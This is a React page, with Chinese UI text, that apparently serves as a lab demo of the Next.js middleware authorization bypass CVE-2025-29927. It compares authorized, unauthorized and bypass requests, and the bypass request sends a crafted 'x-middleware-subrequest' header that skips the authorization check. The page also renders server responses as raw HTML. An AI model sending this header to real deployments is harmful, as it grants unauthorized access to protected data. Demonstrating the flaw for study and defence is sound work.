export default function Home() {
    // 引入React useState
    const { useState } = require('react');

    const [responseContent, setResponseContent] = useState('');
    const [responseType, setResponseType] = useState('');
    const [requestType, setRequestType] = useState('');

    // 普通请求
    const fetchProtectedData = async () => {
        try {
            setRequestType('授权请求');
            const res = await fetch('/api/protected/data', {
                headers: {
                    'Authorization': 'Bearer valid-token'
                }
            });

            const contentType = res.headers.get('content-type');
            let result;

            if (contentType && contentType.includes('application/json')) {
                result = await res.json();
                setResponseContent(JSON.stringify(result, null, 2));
                setResponseType('json');
            } else {
                result = await res.text();
                setResponseContent(result);
                setResponseType('html');
            }
        } catch (error) {
            setResponseContent('Error: ' + error.message);
            setResponseType('text');
        }
    };

    const fetchWithoutAuth = async () => {
        try {
            setRequestType('未授权请求');
            const res = await fetch('/api/protected/data');

            const contentType = res.headers.get('content-type');
            let result;

            if (contentType && contentType.includes('application/json')) {
                result = await res.json();
                setResponseContent(JSON.stringify(result, null, 2));
                setResponseType('json');
            } else {
                result = await res.text();
                setResponseContent(result);
                setResponseType('html');
            }
        } catch (error) {
            setResponseContent('Error: ' + error.message);
            setResponseType('text');
        }
    };

    const bypassAuth = async () => {
        try {
            setRequestType('CVE-2025-29927漏洞请求');
            const res = await fetch('/api/protected/data', {
                headers: {
                    'x-middleware-subrequest': 'middleware:middleware:middleware:middleware:middleware'
                }
            });

            const contentType = res.headers.get('content-type');
            let result;

            if (contentType && contentType.includes('application/json')) {
                result = await res.json();
                setResponseContent(JSON.stringify(result, null, 2));
                setResponseType('json');
            } else {
                result = await res.text();
                setResponseContent(result);
                setResponseType('html');
            }
        } catch (error) {
            setResponseContent('Error: ' + error.message);
            setResponseType('text');
        }
    };

    return (
        <div style={{ fontFamily: 'Arial, sans-serif', maxWidth: '800px', margin: '0 auto', padding: '20px' }}>
            <h1>Next.js 中间件授权绕过漏洞(CVE-2025-29927)演示</h1>

            <div style={{ marginBottom: '30px' }}>
                <p>这个演示展示了如何在Next.js应用中绕过中间件授权检查。</p>
                <p>当添加 <code>x-middleware-subrequest</code> 头时，可以绕过授权中间件。</p>
            </div>

            <div style={{ display: 'flex', gap: '20px', marginBottom: '30px', flexWrap: 'wrap' }}>
                <button
                    onClick={fetchProtectedData}
                    style={{ padding: '10px 20px', backgroundColor: '#4CAF50', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' }}
                >
                    正常访问受保护API（带授权）
                </button>

                <button
                    onClick={fetchWithoutAuth}
                    style={{ padding: '10px 20px', backgroundColor: '#ff9800', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' }}
                >
                    访问受保护API（不带授权）
                </button>

                <button
                    onClick={bypassAuth}
                    style={{ padding: '10px 20px', backgroundColor: '#f44336', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' }}
                >
                    绕过授权检查（CVE-2025-29927）
                </button>
            </div>

            {responseContent && (
                <div style={{ marginTop: '30px', border: '1px solid #ddd', padding: '20px', borderRadius: '4px' }}>
                    <h3>请求类型: {requestType}</h3>
                    <h3>响应内容:</h3>
                    {responseType === 'html' ? (
                        <div style={{ border: '1px solid #eee', padding: '15px', backgroundColor: '#f9f9f9', borderRadius: '4px', overflow: 'auto' }}>
                            <div dangerouslySetInnerHTML={{ __html: responseContent }} />
                        </div>
                    ) : (
                        <pre style={{ whiteSpace: 'pre-wrap', backgroundColor: '#f9f9f9', padding: '15px', borderRadius: '4px', overflow: 'auto' }}>
                            {responseContent}
                        </pre>
                    )}
                </div>
            )}
        </div>
    );
} 